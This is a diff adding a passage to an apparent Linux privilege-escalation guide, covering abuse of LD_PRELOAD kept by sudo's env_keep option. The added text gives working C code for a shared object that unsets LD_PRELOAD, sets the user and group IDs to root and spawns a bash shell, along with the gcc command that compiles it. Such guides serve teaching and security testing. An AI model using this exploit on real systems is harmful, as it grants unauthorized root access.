@@ -367,3 +367,23 @@ The steps of this privilege escalation vector can be summarized as follows;
 1. Check for LD_PRELOAD (with the env_keep option)
 2. Write a simple C code compiled as a share object (.so extension) file
 3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file
+
+The C code will simply spawn a root shell and can be written as follows;  
+
+#include <stdio.h>  
+#include <sys/types.h>  
+#include <stdlib.h>  
+
+void _init() {  
+  unsetenv("LD_PRELOAD");  
+  setgid(0);  
+  setuid(0);  
+  system("/bin/bash");  
+}
+
+We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;  
+
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles  
+
+<img width="690" height="278" alt="image" src="https://github.com/user-attachments/assets/36c69d5f-3228-406b-967f-1af4a05f238e" />
+
